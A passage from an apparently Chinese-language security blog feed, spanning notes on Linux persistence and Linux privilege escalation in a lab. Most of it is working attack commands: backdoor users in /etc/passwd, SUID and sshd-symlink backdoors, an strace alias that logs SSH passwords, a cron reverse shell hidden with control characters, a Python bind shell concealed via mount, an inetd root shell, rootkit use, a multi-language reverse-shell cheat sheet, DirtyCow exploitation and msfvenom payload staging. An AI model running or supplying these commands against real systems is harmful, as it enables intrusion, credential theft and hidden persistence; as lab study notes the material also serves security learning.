c:\WINDOWS\system32\drivers\xlkfs.sys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>驱动隐藏我们通过软件实现Easy File Locker  <a href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p><p>在此软件下，只勾选可读，其他的一律拒绝那么该文件会出现：不会显示、不能通过列目录列出来、也不能删除，除非知道完整路径，才可以读取文件内容。</p><p><img src="/2022/03/07/day39/image-20220308135922941.png" alt="image-20220308135922941"></p><p>但是还是会有办法删除文件</p><ol><li><p>查询服务状态： sc qc xlkfs</p></li><li><p>停止服务： net stop xlkfs </p><p>服务停止以后，经驱动级隐藏的文件显现</p></li><li><p>删除服务： sc delete xlkfs</p></li><li><p>之后删除文件，重启系统，确认服务已经被清理了</p></li></ol><h1 id="linux-权限维持"><a href="#linux-权限维持" class="headerlink" title="linux 权限维持"></a>linux 权限维持</h1><h2 id="修改文件-终端属性"><a href="#修改文件-终端属性" class="headerlink" title="修改文件/终端属性"></a>修改文件/终端属性</h2><h3 id="文件创建时间"><a href="#文件创建时间" class="headerlink" title="文件创建时间"></a>文件创建时间</h3><p>蓝队可以根据文件修改时间来判断文件是否为后门，比如参考index.php的时间来看shell.php的时间，这样就会发现shell.php的生成时间有问题，从而判断它是一个后门</p><p>使用touch命令，touch命令用于修改文件或目录的时间属性，包括存取时间和更改时间。若文件不存在，会建立新的文件。</p><pre class="line-numbers language-none"><code class="language-none">touch -r index.php shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用index.php的是时间属性来创建shell.php</p><p><img src="/2022/03/07/day39/image-20220308143045754.png" alt="image-20220308143045754"></p><h3 id="文件锁定"><a href="#文件锁定" class="headerlink" title="文件锁定"></a>文件锁定</h3><p>linux中可用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l查看不出来，从而达到隐藏权限的目的</p><pre class="line-numbers language-none"><code class="language-none">chattr +i shell.php #锁定文件 rm -rf shell.php #提示禁止删除 lsattr shell.php #属性查看 chattr -i shell.php #解除锁定 rm -rf shell.php #彻底删除文件 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220308143400004.png" alt="image-20220308143400004"></p><h3 id="历史操作命令"><a href="#历史操作命令" class="headerlink" title="历史操作命令"></a>历史操作命令</h3><p>shell中执行的命令，可通过history查看</p><p><img src="/2022/03/07/day39/image-20220308143519317.png" alt="image-20220308143519317"></p><p>如果不想被记录，可以开启无痕模式</p><p>关闭历史记录</p><pre class="line-numbers language-none"><code class="language-none">[space]set +o history<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>space是空格，并且因为空格的缘故，此命令本身也不会被记录</p><p>开启历史记录</p><pre class="line-numbers language-none"><code class="language-none">[Space]set -o history<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是如果之前的命令已经被记录，也可以删除之前的命令记录</p><p>列出想删除的命令中的关键字，通过其前面的数字删除</p><pre class="line-numbers language-none"><code class="language-none">history | grep "shell"history -d [num]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以大规模的删除</p><p>只保留150行</p><pre class="line-numbers language-none"><code class="language-none">sed -i '150,$d' ~/.bash_history<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="passwd增加用户"><a href="#passwd增加用户" class="headerlink" title="passwd增加用户"></a>passwd增加用户</h3><p>同linux suid提权</p><pre class="line-numbers language-none"><code class="language-none">/etc/passwd 各部分含义： 用户名：密码：用户ID：组ID：身份描述：用户的家目录：用户登录后所使用的SHELL/etc/shadow 各部分含义：用户名：密码的MD5加密值：自系统使用以来口令被修改的天数：口令的最小修改间隔：口令更改的周期：口令失效的天数：口令失效以后帐号会被锁定多少天：用户帐号到期时间：保留字段尚未使用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成密码为passwd的密文</p><pre class="line-numbers language-none"><code class="language-none">perl -le 'print crypt("passwd","salt")'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将用户名为xiaosha 密码为passwd的用户写入root组，从而有root权限</p><pre class="line-numbers language-none"><code class="language-none">echo "xiaosha:sadtCr0CILzv2:0:0:/root:/bin/bash" &gt;&gt; /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220308144706618.png" alt="image-20220308144706618"></p><p>也可以远程ssh连接</p><pre class="line-numbers language-none"><code class="language-none">ssh xiaosha@ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220308145158882.png" alt="image-20220308145158882"></p><h2 id="suid后门"><a href="#suid后门" class="headerlink" title="suid后门"></a>suid后门</h2><p>当一个文件所属组的x标志位是s(set uid简称suid)时，且所属组为root时，当执行该文件时，其实是以root身份执行的</p><p>必要条件：</p><ol><li>SUID权限仅对二进制程序有效。 </li><li>执行者对于该程序需要具有x的可执行权限 </li><li>本权限仅在执行该程序的过程中有效 </li><li>在执行过程中执行者将具有该程序拥有者的权限 </li></ol><p>之前在linux提权中，我们是利用具有siud权限且所属为root来提权，此处同理</p><p>在root下创建suid权限文件</p><pre class="line-numbers language-none"><code class="language-none">cp /bin/bash /tmp/.woot chmod 4755 /tmp/.woot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拿shell</p><pre class="line-numbers language-none"><code class="language-none">/tmp/.woot 或/tmp/.woot -p //bash2 针对 suid 有一些护卫的措施，使用-p参数来获取一个root shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ssh连接用户，在tmp下执行就可拿到root</p><p><img src="/2022/03/07/day39/image-20220308155149364.png" alt="image-20220308155149364"></p><h2 id="ssh后门"><a href="#ssh后门" class="headerlink" title="ssh后门"></a>ssh后门</h2><h3 id="ssh软连接后门"><a href="#ssh软连接后门" class="headerlink" title="ssh软连接后门"></a>ssh软连接后门</h3><p>原理是利用PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动时会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测uid 0 即可认证成功，导致了任意密码登录:</p><pre class="line-numbers language-none"><code class="language-none">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>任意输入密码即可登录：</p><pre class="line-numbers language-none"><code class="language-none">ssh root@ip -p端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220308164347929.png" alt="image-20220308164347929"></p><p>优点：可绕过一些安全设备的流量检测，但是在本地查看端口会暴露，我们可以将端口设置为8081 8080这些端口来伪装</p><h3 id="SSH-公钥免密码登陆"><a href="#SSH-公钥免密码登陆" class="headerlink" title="SSH 公钥免密码登陆"></a>SSH 公钥免密码登陆</h3><p>之前在提权用过此方法</p><pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa //生成公钥 cat id_rsa.pub &gt; authorized_keys //将id_rsa.pub内容放到目标.ssh/authorized_keys里 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220308165014230.png" alt="image-20220308165014230"></p><p>生成之后在主目录下的/.ssh就会生成文件</p><p><img src="/2022/03/07/day39/image-20220308165115000.png" alt="image-20220308165115000"></p><p>之后将id_rsa内容拿出来并赋予文件600权限 </p><p>之后通过此文件连接，</p><pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不需要密码即可连接</p><p><img src="/2022/03/07/day39/image-20220308165742695.png" alt="image-20220308165742695"></p><h3 id="Keylogger记录密码"><a href="#Keylogger记录密码" class="headerlink" title="Keylogger记录密码"></a>Keylogger记录密码</h3><p>系统如果存在strace的话，</p><blockquote><p>strace可以跟踪任何进程的系统调用和数据</p></blockquote><p>可以用 strace获取 ssh 的读写连接的数据，抓取管理员登陆其他机器的明文密码</p><p>在当前用户的 .bashrc 里新建一条 alias ，用来抓取他登陆其他机器的 ssh 密码</p><pre class="line-numbers language-none"><code class="language-none">cd ~vi .bashrc <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'//做别名，将记录到的信息导入到/tmp下的文件里<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">source .bashrc//让它生效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220308170606384.png" alt="image-20220308170606384"></p><p>生效后用ssh登录会先执行刚才的命令，刚才那段命令别名也是ssh，之后用ssh登录的信息就会被记录下来</p><p>比如我们  ssh <a href="mailto:root@127.0.0.1">root@127.0.0.1</a>  </p><p>连接后在tmp下就会生成log文件，我们可通过此命令读取</p><pre class="line-numbers language-none"><code class="language-none">grep -A 9 'password' .ssh-2210月101634901802.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可看到接收到了密码</p><p><img src="/2022/03/07/day39/image-20220308185839471.png" alt="image-20220308185839471"></p><h2 id="Ubuntu利用Cron安装后门"><a href="#Ubuntu利用Cron安装后门" class="headerlink" title="Ubuntu利用Cron安装后门"></a>Ubuntu利用Cron安装后门</h2><p>Cron是ubuntu下默认启动的用户执行计划，它会按照设置，在固定的周期或一定时间执行某个任务。</p><p>它是一项服务，可使用基本的服务查看状态命令等查看信息。</p><pre class="line-numbers language-none"><code class="language-none">service cron status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把反弹shell写入计划任务，*为立即执行</p><pre class="line-numbers language-none"><code class="language-none">(crontab -l;printf "* * * * * /bin/bash -c '/bin/sh -i &gt;&amp; /dev/tcp/192.168.80.134/8888 0&gt;&amp;1';\r%100c\n")|crontab -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看命令是否写入，编辑任务</p><pre class="line-numbers language-none"><code class="language-none">crontab -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看计划任务，但是此命令查看不到写入的反弹shell，以为我们使用了特殊字符\r \n，所以不容易被发现</p><pre class="line-numbers language-none"><code class="language-none">cat /var/spool/cron/crontabs/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>计划任务运行后，拿到了反弹shell</p><p>因为是root下的计划任务，所以拿到了root</p><p><img src="/2022/03/07/day39/image-20220309124058143.png" alt="image-20220309124058143"></p><h2 id="vim-python-拓展后门"><a href="#vim-python-拓展后门" class="headerlink" title="vim python 拓展后门"></a>vim python 拓展后门</h2><p>适用于装了vim 和python的linux</p><p>创建</p><p>dir.py 正向后门</p><pre class="line-numbers language-none"><code class="language-none">from socket import * import subprocess import os, threading, sys, time if __name__ == "__main__":   server=socket(AF_INET,SOCK_STREAM) server.bind(('0.0.0.0',11)) server.listen(5) print ('waiting for connect') talk, addr = server.accept() print ('connect from',addr) proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk, stdout=talk, stderr=talk, shell=True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行py文件</p><p>这里让它运行完之后2s删除此文件，减少被发现可能</p><pre class="line-numbers language-none"><code class="language-none">$(nohup vim -E -c "py3file dir.py"&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>#将nohup的执行结果输出到/dev/null中 </p><p>#其中/dev/null在linux中代表空设备，结果输出到空设备也就是丢弃nohup的执行结果。 </p><p>#“2”在linux中代表错误输出，“1”在linux中代表标准输出，在此处也就是nohup的输出。2&gt;&amp;1表示将错误 输出绑定到标准输出上，在此处也就是将错误输出同样输出到空设备上不进行显示。这样，无论nohup执行结 果是否正确，都不会有输出。</p></blockquote><p>连接11端口，拿到shell</p><pre class="line-numbers language-none"><code class="language-none">nc -vv 192.168.80.146 11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220309130637287.png" alt="image-20220309130637287"></p><p>但是运行完之后，可查看到可疑进程vim</p><pre class="line-numbers language-none"><code class="language-none">netstat -anpt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220309130118209.png" alt="image-20220309130118209"></p><p>如果管理员看到此，很容易被发现，我们需要将他隐藏起来</p><p>创建一个mull目录，将此进程挂载到mull目录下</p><pre class="line-numbers language-none"><code class="language-none">mkdir null mount --bind null /proc/2520<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>#mount –bind命令是将前一个目录挂载到后一个目录上，所有对后一个目录的访问其实都是对前一个目录的访问，并且会将前一个目录路径隐藏起来</p></blockquote><p><img src="/2022/03/07/day39/image-20220309130535159.png" alt="image-20220309130535159"></p><p>可以查看挂载的目录</p><pre class="line-numbers language-none"><code class="language-none">cat /proc/$$/mountinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220309130557066.png" alt="image-20220309130557066"></p><p>取消挂载</p><pre class="line-numbers language-none"><code class="language-none">sudo umount /proc/2520<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="inetd后门"><a href="#inetd后门" class="headerlink" title="inetd后门"></a>inetd后门</h2><p>inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。</p><p>当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。</p><p>所以，如果我们已经在目标系统的inetd配置文件中配置好，那么来自外部的某个socket是要执行一个可交互的shell，就获取了一个后门。</p><p>配置inetd</p><pre class="line-numbers language-none"><code class="language-none">修改默认端口 /etc/services woot 6666/tcp #evil backdoor service 然后修改conf文件/etc/inetd.conf  woot stream tcp nowait root /bin/bash bash -i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处6666就是我们连接进来的端口，可以设置为常见的端口</p><p>配置完后inetd运行它</p><p>之后通过6666连接进来</p><pre class="line-numbers language-none"><code class="language-none">nc -vv 192.168.80.146 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220309131939876.png" alt="image-20220309131939876"></p><h2 id="rootkit后门"><a href="#rootkit后门" class="headerlink" title="rootkit后门"></a>rootkit后门</h2><p>rootkit分为内核级和应用级两种:内核级的比如：Diamorphine，应用级的比如：Mafix</p><h3 id="Diamorphine"><a href="#Diamorphine" class="headerlink" title="Diamorphine"></a>Diamorphine</h3><p><a href="https://github.com/m0nad/Diamorphine.git">https://github.com/m0nad/Diamorphine.git</a></p><p>目标需要make和gcc</p><p>进入工具的目录</p><p>安装模块</p><pre class="line-numbers language-none"><code class="language-none">make<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220309150242067.png" alt="image-20220309150242067"></p><p>之后必须以root权限运行</p><pre class="line-numbers language-none"><code class="language-none">insmod diamorphine.ko<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取root</p><pre class="line-numbers language-none"><code class="language-none">kill -64 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/07/day39/image-20220309150314241.png" alt="image-20220309150314241"></p><p>可看到web2用户拿到了root权限</p><p>创建隐藏文件，ls，du都找不到</p><pre class="line-numbers language-none"><code class="language-none">kill -63 pid号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只要是diamorphine_secret开头的文件名或者文件夹，就会隐藏。</p><pre class="line-numbers language-none"><code class="language-none">touch diamorphine_secret <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>卸载diamorphine模块，需要root权限</p><pre class="line-numbers language-none"><code class="language-none">rmmod diamorphine<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux提权</title>
      <link href="/2022/03/04/day38/"/>
      <url>/2022/03/04/day38/</url>
      
        <content type="html"><![CDATA[<h1 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h1><p>kali命令参考60之day13</p><span id="more"></span><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><pre class="line-numbers language-none"><code class="language-none">uname -a #查看内核/操作系统/cpu信息 head -n 1 /etc/issue #查看操作系统版本 cat /proc/version #查看系统信息 hostname #查看计算机名 env #查看环境变量 ifconfig #查看网卡 netstat -lntp # 查看所有监听端口 netstat -antp # 查看所有已经建立的连接 netstat -s # 查看网络统计信息 iptables -L #查看防火墙设置 route -n # 查看路由表 ps -ef # 查看所有进程 top # 实时显示进程状态 w # 查看活动用户 id # 查看指定用户信息 last # 查看用户登录日志 cut -d: -f1 /etc/passwd # 查看系统所有用户 cut -d: -f1 /etc/group # 查看系统所有组 crontab -l # 查看当前用户的计划任务 chkconfig –list # 列出所有系统服务 chkconfig –list | grep on # 列出所有启动的系统服务 echo $PATH #查看系统路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="反弹shell命令"><a href="#反弹shell命令" class="headerlink" title="反弹shell命令"></a>反弹shell命令</h2><p>一般有一个webshel下，在里面执行反弹shell</p><p>nc监听本地端口</p><pre class="line-numbers language-none"><code class="language-none">nc -lvnp 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/192.168.80.134/8888 0&gt;&amp;1 bash -c "bash -i &gt;&amp; /dev/tcp/192.168.80.134/8888 0&gt;&amp;1"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><pre class="line-numbers language-none"><code class="language-none">nc -e /bin/sh 192.168.2.130 4444 但某些版本的nc没有-e参数(非传统版),则可使用以下方式解决 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.80.134 8888 &gt;/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre class="line-numbers language-none"><code class="language-none">import socket,subprocess,os s =socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(( "192.168.2.130" , 4444 )) os.dup2(s.fileno(), 0 ) os.dup2(s.fileno(), 1 ) os.dup2(s.fileno(), 2 ) p = subprocess.call([ "/bin/bash" , "-i" ])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h3><pre class="line-numbers language-none"><code class="language-none">php -r '$sock=fsockopen("192.168.2.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ruby反弹shell"><a href="#ruby反弹shell" class="headerlink" title="ruby反弹shell"></a>ruby反弹shell</h3><pre class="line-numbers language-none"><code class="language-none">ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="java反弹shell"><a href="#java反弹shell" class="headerlink" title="java反弹shell"></a>java反弹shell</h3><pre class="line-numbers language-none"><code class="language-none">Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[]) p.waitFor()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="xterm反弹shell"><a href="#xterm反弹shell" class="headerlink" title="xterm反弹shell"></a>xterm反弹shell</h3><pre class="line-numbers language-none"><code class="language-none">xterm -display 10.0.0.1:1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="一些复现"><a href="#一些复现" class="headerlink" title="一些复现"></a>一些复现</h3><p>kali监听8888</p><p><strong>bash反弹</strong></p><p>执行bash -i &gt;&amp; /dev/tcp/192.168.80.134/8888 0&gt;&amp;1 </p><p><img src="/2022/03/04/day38/image-20220304123748428.png" alt="image-20220304123748428"></p><p><strong>nc反弹</strong></p><p>可看到可执行系统命令，且有nc</p><p><img src="/2022/03/04/day38/image-20220304124528673.png" alt="image-20220304124528673"></p><p>这里执行后没有成功反弹</p><pre class="line-numbers language-none"><code class="language-none">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.80.134 8888 &gt;/tmp/f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们抓包放到bp，post提交，也失败</p><p>将cmd后Ctrl+u编码提交，成功反弹shell</p><p><img src="/2022/03/04/day38/image-20220304125327522.png" alt="image-20220304125327522"></p><p><strong>python调用本地shell实现交互式命令行</strong></p><p>终端有些时候系统的命令终端不允许直接访问，可以使用python虚拟化一个终端来执行</p><pre class="line-numbers language-none"><code class="language-none">python -c 'import pty;pty.spawn("/bin/bash")' python3 -c 'import pty;pty.spawn("/bin/bash")'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220304125636986.png" alt="image-20220304125636986"></p><p><strong>Linux反弹shell解决乱码</strong></p><p>为了方便使用，解决shell乱码问题，以便正常tab补充等</p><p>kali默认shell为zsh，这里需要bash切换shell</p><p>获得shell后，py调用本地shell实现交互式命令行</p><p> Ctrl+z放后台</p><p>执行</p><pre class="line-numbers language-none"><code class="language-none">stty -echo raw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>fg调用，即可解决乱码</p><p>可正常使用tab</p><p><img src="/2022/03/04/day38/image-20220304143132187.png" alt="image-20220304143132187"></p><h2 id="Linux内核漏洞提权"><a href="#Linux内核漏洞提权" class="headerlink" title="Linux内核漏洞提权"></a>Linux内核漏洞提权</h2><p>通常我们拥有一个webshell的时候，一般权限都是WEB容器权限，如在iis就是iis用户组权限，在apache 就是apache权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息，ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限 超级管理员权限。</p><h3 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h3><p>bash反弹shell，并解决乱码问题，操作不赘述</p><p>利用堆栈溢出漏洞</p><p>根据当前系统，寻找对应的漏洞的exp，使用exp对其进行提权。</p><p>查看当前版本信息</p><pre class="line-numbers language-none"><code class="language-none">uname -a cat /proc/version cat /etc/issue lsb_release -a cat /etc/redhat-release 有redhat可用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220304145543688.png" alt="image-20220304145543688"></p><p>查看版本对应可使用的exp</p><pre class="line-numbers language-none"><code class="language-none">searchsploit -t 3.19searchsploit -s 3.19 searchsploit -x linux/local/37292.c可查看具体内容searchsploit -s Linux Kernel 3.13.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220304145911938.png" alt="image-20220304145911938"></p><p>可把exp拿下来</p><p><img src="/2022/03/04/day38/image-20220304150507792.png" alt="image-20220304150507792"></p><p>webshell里有gcc，所以可在webshell里进行编译，如果没有的话就需要在本地编译</p><p><img src="/2022/03/04/day38/image-20220304150714005.png" alt="image-20220304150714005"></p><p>开启小型服务器</p><p>webshell中用wget把exp下载到tmp下</p><pre class="line-numbers language-none"><code class="language-none">wget http:192.168.80.134/37292.c /tmp/37292.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220304152248312.png" alt="image-20220304152248312"></p><p>用gcc将此文件编译，这里将他叫做exp，也可在桌面gcc编译后wget下载编译好的exp</p><pre class="line-numbers language-none"><code class="language-none">gcc 37292.c -o exp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220304152428530.png" alt="image-20220304152428530"></p><p>exp并没有执行权限，需要赋予权限</p><p><img src="/2022/03/04/day38/image-20220304153629189.png" alt="image-20220304153629189"></p><p>执行exp后提权成功</p><pre class="line-numbers language-none"><code class="language-none">./exp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220304153749072.png" alt="image-20220304153749072"></p><h3 id="脏牛提权-CVE-2016-5195"><a href="#脏牛提权-CVE-2016-5195" class="headerlink" title="脏牛提权(CVE-2016-5195)"></a>脏牛提权(CVE-2016-5195)</h3><p> Linux 内核的内存子系统在处理 写 时拷贝（Copy-on-Write）时，存在条件竞争漏洞， 导致破坏私有只读内存映射。黑客可以在获取低权限的的本地用户后，利用此漏洞获取其他只读内存映射的写权限，进一步获取 root 权限。</p><p>exp下载 <a href="https://github.com/Brucetg/DirtyCow-EXP">https://github.com/Brucetg/DirtyCow-EXP</a></p><p>在靶机上创建一个普通用户</p><pre class="line-numbers language-none"><code class="language-none">adduser xiaosha<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载exp</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/Brucetg/DirtyCow-EXP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再下载好的文件位置开启小型htttp服务器</p><p>把exp放到shell的tmp下</p><p><img src="/2022/03/04/day38/image-20220304192156361.png" alt="image-20220304192156361"></p><p>这里exp拉下来发现已经编译过了，就不用gcc再编译了</p><p>拉下来还是没有权限执行，增加权限</p><p><img src="/2022/03/04/day38/image-20220304192344508.png" alt="image-20220304192344508"></p><p>执行exp</p><pre class="line-numbers language-none"><code class="language-none">./dirtycow /etc/group "$(sed '/\(sudo*\)/ s/$/,xiaosha/' /etc/group)"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220304192727604.png" alt="image-20220304192727604"></p><p>切换为刚才创建的用户 id</p><p><img src="/2022/03/04/day38/image-20220304193246727.png" alt="image-20220304193246727"></p><p>可以看到已经加到sudo组里面，已经是一个root权限的用户了</p><p><img src="/2022/03/04/day38/image-20220304193344660.png" alt="image-20220304193344660"></p><p>大概思路就是把普通用户加到sudo组里面，相当于普通用户有了root权限</p><h2 id="metasploit-linux-提权"><a href="#metasploit-linux-提权" class="headerlink" title="metasploit linux 提权"></a>metasploit linux 提权</h2><p>整体思路跟windows相似</p><p><strong>生成反向连接</strong></p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.80.134 LPORT=12345 -f raw &gt; msf.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>生成后开启http小型服务器</strong></p><p><img src="/2022/03/04/day38/image-20220304195147217.png" alt="image-20220304195147217"></p><p><strong>使用php中的 file_put_contents函数把后门写入tmp目录</strong>，因为这个目录是可写的</p><p><img src="/2022/03/04/day38/image-20220304195408749.png" alt="image-20220304195408749"></p><pre class="line-numbers language-none"><code class="language-none">file_put_contents('../tmp/m.php',file_get_contents('http://192.168.80.134/msf.php')); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220304195524689.png" alt="image-20220304195524689"></p><p>查看是否写入</p><pre class="line-numbers language-none"><code class="language-none">system('ls -al ../tmp');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220304205141552.png" alt="image-20220304205141552"></p><p><strong>msf进行本地监听</strong></p><p><strong>访问tmp下的m.php</strong>，即可得到一个session</p><p><img src="/2022/03/04/day38/image-20220304205514912.png" alt="image-20220304205514912"></p><p><img src="/2022/03/04/day38/image-20220304205550088.png" alt="image-20220304205550088"></p><p>可以使用模块查询漏洞</p><pre class="line-numbers language-none"><code class="language-none">run post/multi/recon/local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里没有查询到信息</p><p><strong>用shell 使用终端</strong>，可执行一些命令</p><p><strong>py调用本地shell将他改为交互式</strong></p><p><img 